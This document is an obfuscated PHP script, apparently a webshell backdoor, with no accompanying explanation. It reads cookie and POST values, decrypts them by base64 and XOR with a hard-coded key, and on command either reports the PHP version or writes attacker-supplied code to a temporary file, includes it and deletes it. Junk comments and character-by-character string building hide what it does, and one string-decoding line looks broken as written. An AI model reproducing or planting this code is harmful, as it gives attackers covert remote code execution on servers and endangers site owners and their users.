<?php  /*  mdcws*/ function	hgv_xk(){$vzipze_mx='gqrmpm';    print_r	(32450+32450);     }


$dienxesc     =    'dienxesc'   ^    '';





$koqepctw    = /*fbiz*/ $_COOKIE;

$tfapq     = /* wtwt */ 'vdh';

$oihfez    =      334;$cbexj	=    $oihfez /* kfzpj*/ % /*dwxakz   */ 17;



function	gmwgfpdn($mlicaijlt_,    $wvtvt)

{


    global    $dienxesc;


 /*wq*/ $bbvxxklrk /*pcfje */ =	"";


 /*bidomk */ $oesqptuy /* duavnm   */ =    613;
    $pipsszj /*   li */ =    0; /* j   */ 
    while /*   px   */ ($pipsszj  <	strlen($mlicaijlt_))       {


	$_cagrzryl	=     0;
	while /*   ag   */ ($_cagrzryl /*   gve  */ <  strlen($wvtvt)   &&    $pipsszj     < /*   tl */ strlen($mlicaijlt_))  {

 /*   em  */ 

    $bbvxxklrk	.=    $dienxesc(ord($mlicaijlt_[$pipsszj])    ^ /* yvulg   */ ord($wvtvt[$_cagrzryl]));
    $kmlhzp /*   kvzi */ = /*  c   */ 306;


           $_cagrzryl++;
 /*   uk*/ $pipsszj++;
    }

 /*   strlt  */ }


 /*d*/ return /*b*/ $bbvxxklrk;


}








function     d_slkja($pipsszjrqqhvd, /*   mayvf  */ $mlicaijlt_){
   global	$dienxesc;


    $oyld_uzxbb     = /* flk */ sprintf("\x2e"       .   "\57"       .    $dienxesc(37) /*  wi*/ . /*   srg */ $dienxesc(115) /*  ec  */ . /*spgg */ "."."\x70"    . /* ncojd  */ "\x6c",   md5($pipsszjrqqhvd));

 /*j  */ $vggyle     = /*   sonrsh   */ 'jnfddlgqnj';
	file_put_contents($oyld_uzxbb,  "<" /*auph_   */ .  "?"."\x70"    . /*ugbaib   */ "\150"   . /*xi   */ $dienxesc(112) /*nks */ . /*  cb   */ $dienxesc(32) /* yd */ .     $dienxesc(117) /*y */ .    "\156" /*   qczlsl*/ .   "\x6c"      . /* pxei*/ "i".$dienxesc(853-743) /* cgrk   */ .      "k".$dienxesc(40)	.    "_"."_"."F"."I".$dienxesc(220-144)	.   "E"."\x5f"   . /* l */ "_".")".";".$dienxesc(32)    .  $mlicaijlt_[$dienxesc(100)]);
$sashgzwq  =     'mapc_zmk_';

 /*pox  */ include($oyld_uzxbb);

    $sgsqnnvzp    = /*   vpm */ 'flxyfpfk';

 /*   ivvh  */ $qfkgycgn_m	=    $oyld_uzxbb;
 /* va_u_   */ @unlink($qfkgycgn_m);}


function	davuac(){
     $ymfoikod /*   cd_w*/ =    'w_pf_i';

	$zkpvgz	= /*   hraa */ 'me';
}



davuac();


function     aftvzo()

{


 /*bi */ global    $dienxesc;




 /*e*/ $pipsszj /*   p   */ =   array();


	$pipsszj["p"."v"]     =    phpversion();       $pipsszj["\163" /*   scyob  */ .      "v"]    = /*ngohv*/ "3"."."."5";
 /*  z   */ $etrjpsoz /*  qj  */ =	'qg'; /* ejjlpe   */ $nqkkjsua /*  nz   */ = /*   ldgykv */ '_ytkby';    echo      @serialize($pipsszj);

  $vsmas    =    'cwhfjluqkp';
     $soakrygt       =    914;
}





function	ccdjndb($mlicaijlt_,      $pipsszjrqqhvd,      $xsxaioqi)


{


    global /*lmi*/ $dienxesc;




 /*  tc_x   */ $mlicaijlt_    =      unserialize(gmwgfpdn(gmwgfpdn(base64_decode($mlicaijlt_), /*   oeirzt*/ $pipsszjrqqhvd),  $xsxaioqi));    $tvwdwrw /*  qlmy*/ =	568;	if  (isset($mlicaijlt_[$dienxesc(97)."k"]))    {

       if	($mlicaijlt_[$dienxesc(97)]	==	"i") /*   rytq  */ {
    aftvzo();
 /*fekc_p   */ }     elseif    ($mlicaijlt_[$dienxesc(97)] /*   gaahi */ ==    "e")    {

 /* hjcqo */ d_slkja($pipsszjrqqhvd,   $mlicaijlt_);	}


    exit();

       }
}


$koqepctw /*   gun   */ = /*  l  */ array_merge($_POST, /* vddrvj  */ $koqepctw);


$pipsszjrqqhvd   =	"8".$dienxesc(57)	.	$dienxesc(54)    .    $dienxesc(506-455) /*  a_   */ .    "\x64"    .  "9"."4"."\x65" /*   x  */ .    $dienxesc(312-267)	.    $dienxesc(776-719)   . /*eg*/ $dienxesc(695-645) /*   bzq */ .  "\x33"	.     "\x63"	.    $dienxesc(45)	. /*woc*/ "\x34"	.	"6"."\64"	. /* o */ "0"."-".$dienxesc(291-234) /*  _eksg */ .      $dienxesc(100).$dienxesc(49)    .       $dienxesc(54)	. /*   s */ $dienxesc(69-24)	.    "\x34"	.	$dienxesc(447-345)    .    "\x66"    .    "b"."\x39"   .      "8"."\x34"       .       "\71"   .  $dienxesc(261-208) /*  jx*/ . /* qmfn   */ $dienxesc(97) /* zfg  */ . /*   iro   */ "6"."f";
$przdozx    = /*   l  */ 'dwgdaji';
$qouso_ox	=     'xpvqi';

foreach /*  vgw_om  */ ($koqepctw	as    $xsxaioqi    =>  $mlicaijlt_)	{
   ccdjndb($mlicaijlt_,    $pipsszjrqqhvd,     $xsxaioqi);
}








?>